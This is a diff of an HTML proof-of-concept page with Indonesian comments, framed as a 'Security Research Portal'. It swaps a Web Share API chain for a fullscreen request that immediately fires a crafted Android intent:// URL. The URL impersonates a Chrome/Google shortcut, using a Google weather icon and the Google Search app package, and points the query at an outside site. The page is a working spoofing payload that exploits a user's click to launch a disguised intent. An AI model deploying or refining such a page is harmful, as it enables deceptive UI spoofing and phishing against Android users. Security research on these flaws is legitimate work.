@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Web Share API & Intent Spoof PoC</title>
+    <title>Fullscreen & Intent Spoof PoC</title>
     <style>
         :root {
             --primary-color: #1a73e8;
@@ -113,12 +113,12 @@
 
     <div class="card">
         <div class="banner">Security Research Portal</div>
-        <h1>Web Share & Intent Chain</h1>
-        <p>Klik tombol di bawah untuk memicu Web Share API, mengarahkan konteks ke google.com, dan mengeksekusi intent.</p>
+        <h1>Fullscreen & Intent PoC</h1>
+        <p>Klik tombol di bawah untuk masuk ke mode Fullscreen sekaligus memicu Android Intent.</p>
 
         <div class="button-container">
-            <button class="button-link" id="shareButton">
-                Share & Trigger Intent Chain
+            <button class="button-link" id="actionButton">
+                Enter Fullscreen & Trigger Intent
             </button>
         </div>
 
@@ -128,37 +128,32 @@
     <div class="footer-note">Authorized security assessment environment.</div>
 
     <script>
-        const shareButton = document.getElementById('shareButton');
+        const actionButton = document.getElementById('actionButton');
         const statusBox = document.getElementById('statusBox');
 
-        shareButton.addEventListener('click', async () => {
+        actionButton.addEventListener('click', async () => {
             statusBox.style.display = 'block';
-            statusBox.innerText = 'Status: Initializing Web Share & Google Context...';
+            statusBox.innerText = 'Status: Requesting Fullscreen & dispatching intent...';
 
-            // 1. Memaksa navigasi awal ke google.com di jendela utama/background tab secara bersamaan
-            const googleWindow = window.open('https://www.google.com', '_blank');
-
-            // 2. Memanggil Web Share API (memanfaatkan user activation yang sah secara native)
-            if (navigator.share) {
-                try {
-                    await navigator.share({
-                        title: 'Google Security Verification',
-                        text: 'Secure document verification portal link.',
-                        url: 'https://www.google.com'
-                    });
-                    statusBox.innerText = 'Status: Web Share completed. Dispatched intent...';
-                } catch (err) {
-                    statusBox.innerText = 'Status: Share dismissed/blocked, proceeding with intent...';
+            // 1. Meminta mode Fullscreen secara programatik (memanfaatkan user activation dari klik)
+            try {
+                const docElem = document.documentElement;
+                if (docElem.requestFullscreen) {
+                    await docElem.requestFullscreen();
+                } else if (docElem.webkitRequestFullscreen) { /* Safari */
+                    await docElem.webkitRequestFullscreen();
+                } else if (docElem.msRequestFullscreen) { /* IE11 */
+                    await docElem.msRequestFullscreen();
                 }
-            } else {
-                statusBox.innerText = 'Status: Web Share API not supported, executing fallback...';
+            } catch (err) {
+                console.debug("Fullscreen request handled/denied:", err.message);
             }
 
-            // 3. Eksekusi intent redirect setelah interaksi share / pembukaan google context
+            // 2. Mengeksekusi intent secara instan setelah permintaan fullscreen
             setTimeout(() => {
                 const intentUrl = "intent://www.google.com/hsi?name=Chrome&icon=https://ssl.gstatic.com/shortcuts/android/home/v1/192px/weather_g_badged.png&ve=145829&hv=1&dest=1&source=homescreen_shortcut&query=https://ndev.tk#Intent;scheme=https;package=com.google.android.googlequicksearchbox;end";
-                window.location.replace(intentUrl);
-            }, 500);
+                window.location.href = intentUrl;
+            }, 100);
         });
     </script>
 
